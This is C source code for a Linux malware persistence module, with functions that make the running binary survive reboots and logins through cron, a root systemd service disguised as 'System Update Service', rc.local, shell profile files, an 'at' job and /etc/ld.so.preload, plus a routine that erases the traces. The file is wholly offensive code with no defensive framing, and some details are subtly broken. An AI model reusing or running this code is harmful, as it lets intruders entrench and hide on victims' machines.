#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <sys/stat.h>
#include <errno.h>

int setup_cron_persistence() {
    char cron_cmd[512];
    char current_path[1024];
    
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    snprintf(cron_cmd, sizeof(cron_cmd), 
             "(crontab -l 2>/dev/null; echo '*/5 * * * * %s >/dev/null 2>&1') | crontab -", 
             current_path);
    
    FILE *fp = popen(cron_cmd, "r");
    if (!fp) return 0;
    
    int ret = pclose(fp);
    return ret == 0;
}

int setup_systemd_persistence() {
    char service_path[256];
    char current_path[1024];
    
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    const char *service_template = 
        "[Unit]\n"
        "Description=System Update Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=forking\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=60\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";
    
    snprintf(service_path, sizeof(service_path), "/etc/systemd/system/sysupdate.service");
    
    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return 0;
    
    char service_content[1024];
    snprintf(service_content, sizeof(service_content), service_template, current_path);
    
    ssize_t written = write(fd, service_content, strlen(service_content));
    close(fd);
    
    if (written <= 0) return 0;
    
    system("systemctl daemon-reload");
    system("systemctl enable sysupdate.service");
    system("systemctl start sysupdate.service");
    
    return 1;
}

int setup_rc_local_persistence() {
    char current_path[1024];
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    int fd = open("/etc/rc.local", O_RDWR | O_APPEND);
    if (fd < 0) {
        fd = open("/etc/rc.local", O_WRONLY | O_CREAT, 0755);
        if (fd < 0) return 0;
        write(fd, "#!/bin/bash\n", 12);
    }
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s &>/dev/null &\n", current_path);
    write(fd, cmd, strlen(cmd));
    close(fd);
    
    chmod("/etc/rc.local", 0755);
    return 1;
}

int setup_profile_persistence() {
    char current_path[1024];
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    const char *shells[] = {"/etc/profile", "/etc/bash.bashrc", NULL};
    
    for (int i = 0; shells[i]; i++) {
        int fd = open(shells[i], O_RDWR | O_APPEND);
        if (fd < 0) continue;
        
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "\n[ -x %s ] && %s &>/dev/null &\n", current_path, current_path);
        write(fd, cmd, strlen(cmd));
        close(fd);
    }
    
    return 1;
}

int setup_at_persistence() {
    char current_path[1024];
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    char at_cmd[512];
    snprintf(at_cmd, sizeof(at_cmd), "echo '%s >/dev/null 2>&1' | at now + 1 minute", current_path);
    
    return system(at_cmd) == 0;
}

int setup_malicious_library() {
    char current_path[1024];
    readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
    
    const char *ld_preload = "/etc/ld.so.preload";
    int fd = open(ld_preload, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return 0;
    
    char lib_path[512];
    snprintf(lib_path, sizeof(lib_path), "%s\n", current_path);
    write(fd, lib_path, strlen(lib_path));
    close(fd);
    
    chmod(ld_preload, 0644);
    return 1;
}

int setup_persistence(int method) {
    int success = 0;
    
    switch(method) {
        case 1:
            success = setup_cron_persistence();
            break;
        case 2:
            success = setup_systemd_persistence();
            break;
        case 3:
            success = setup_rc_local_persistence();
            break;
        case 4:
            success = setup_profile_persistence();
            break;
        case 5:
            success = setup_at_persistence();
            break;
        case 6:
            success = setup_malicious_library();
            break;
        default:
            success = setup_cron_persistence() || setup_rc_local_persistence();
            break;
    }
    
    return success;
}

void cleanup_persistence() {
    system("crontab -l | grep -v sysupdate | crontab -");
    system("systemctl disable sysupdate.service");
    system("rm -f /etc/systemd/system/sysupdate.service");
    system("sed -i '/sysupdate/d' /etc/rc.local");
    system("sed -i '/sysupdate/d' /etc/profile");
    system("sed -i '/sysupdate/d' /etc/bash.bashrc");
}